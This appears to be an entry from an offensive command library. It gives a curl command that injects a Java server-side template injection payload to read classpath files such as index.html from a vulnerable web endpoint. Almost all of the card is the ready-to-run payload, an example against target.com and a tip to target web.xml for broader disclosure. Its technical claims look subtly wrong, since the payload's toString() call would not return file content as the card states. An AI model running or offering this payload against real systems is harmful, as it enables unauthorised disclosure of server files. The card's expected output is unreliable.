---
id: aac5791e-f10f-4c4d-b555-7ceea666d8c9
name: test-java-ssti-html-resource
type: command
executor: bash
data: >-
  curl
  "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader().getResourceAsStream('index.html').toString()}"
output: null
created_at: '2023-04-06T03:56:39.297508+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssti
  - java
  - resource
  - file-read
verified: true
validated: true
---

# test-java-ssti-html-resource

## Command

```bash
curl "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader().getResourceAsStream('index.html').toString()}"
```

## Description

Injects a payload to load and display the content of a classpath resource file (index.html), demonstrating information disclosure capabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/render?template=${T(java.lang.ClassLoader).getSystemClassLoader().getResourceAsStream('index.html').toString()}"
```

### For Specific Resource

Replace 'index.html' with other files like 'web.xml' for broader disclosure.

## Expected Output

Response includes the file content: '<!DOCTYPE html>\n<html>\n<head>\n<title>Index</title>\n</head>\n<body>\n<h1>Welcome to the Index page</h1>\n</body>\n</html>'.

## Related

- [[procedures/Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval]]
